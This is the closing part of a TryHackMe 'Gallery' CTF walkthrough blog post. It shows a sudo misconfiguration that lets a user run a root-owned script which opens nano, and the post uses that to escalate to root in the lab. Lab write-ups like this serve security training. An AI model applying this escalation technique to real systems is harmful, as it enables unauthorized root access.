</span></span><span style="display:flex;"><span>$ su mike -l                                                                                          
</span></span><span style="display:flex;"><span>Password: 
</span></span><span style="display:flex;"><span>mike@gallery:~$ cat user.txt 
</span></span><span style="display:flex;"><span>THM<span style="color:#f92672">{</span>xxxx-xxx-xxx-xxxx<span style="color:#f92672">}</span>
</span></span></code></pre></div><h1 id="escalating-to-root">Escalating to Root</h1>
<h2 id="sudo-privileges">Sudo Privileges</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo -l
</span></span><span style="display:flex;"><span>Matching Defaults entries <span style="color:#66d9ef">for</span> mike on gallery:
</span></span><span style="display:flex;"><span>    env_reset, mail_badpass, secure_path<span style="color:#f92672">=</span>/usr/local/sbin<span style="color:#ae81ff">\:</span>/usr/local/bin<span style="color:#ae81ff">\:</span>/usr/sbin<span style="color:#ae81ff">\:</span>/usr/bin<span style="color:#ae81ff">\:</span>/sbin<span style="color:#ae81ff">\:</span>/bin<span style="color:#ae81ff">\:</span>/snap/bin
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>User mike may run the following commands on gallery:
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> NOPASSWD: /bin/bash /opt/rootkit.sh
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ cat /opt/rootkit.sh
</span></span><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>read -e -p <span style="color:#e6db74">&#34;Would you like to versioncheck, update, list or read the report ? &#34;</span> ans;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Execute your choice</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> $ans in
</span></span><span style="display:flex;"><span>    versioncheck<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>        /usr/bin/rkhunter --versioncheck ;;
</span></span><span style="display:flex;"><span>    update<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>        /usr/bin/rkhunter --update;;
</span></span><span style="display:flex;"><span>    list<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>        /usr/bin/rkhunter --list;;
</span></span><span style="display:flex;"><span>    read<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>        /bin/nano /root/report.txt;;
</span></span><span style="display:flex;"><span>    *<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>        exit;;
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">esac</span>
</span></span></code></pre></div><p><strong>Privilege Escalation Steps :</strong></p>
<ul>
<li>Run <code>sudo /bin/bash /opt/rootkit.sh</code></li>
<li>Type in <code>read</code></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ sudo /bin/bash /opt/rootkit.sh
</span></span><span style="display:flex;"><span>Would you like to versioncheck, update, list or read the report ? read
</span></span></code></pre></div><ul>
<li>Read <code>/root/root.txt</code> using command <code>nano</code> to execute commands
<img src="/blogs/images/thm/gallery666/thm_gallery_root_flag.png" alt="Root Flag"></li>
</ul>

  <hr>
<div class="footer">
    
	    
            
	            <a class="previous-post" href="https://whokilleddb.github.io/blogs/posts/thm_dig_dug/?ref=footer">« TryHackMe: Dig Dug</a>
	        
        
	    
            
	            <a class="next-post" href="https://whokilleddb.github.io/blogs/posts/dotnet-clr-etw/?ref=footer">A gentle guide to the land of .NET, CLR and ETW »</a>
	        
        
    
</div>

  <div class="article-toc " >
    <h4></h4>
    <nav id="TableOfContents">
  <ul>
    <li><a href="#run-the-exploit">Run the exploit</a></li>
    <li><a href="#get-a-reverse-shell">Get A Reverse Shell</a></li>
    <li><a href="#get-admin-hash">Get Admin Hash</a></li>
    <li><a href="#get-user-flag">Get User Flag</a></li>
  </ul>

  <ul>
    <li><a href="#sudo-privileges">Sudo Privileges</a></li>
  </ul>
</nav>
</div>

</div>
        </main>
    </body>
</html>
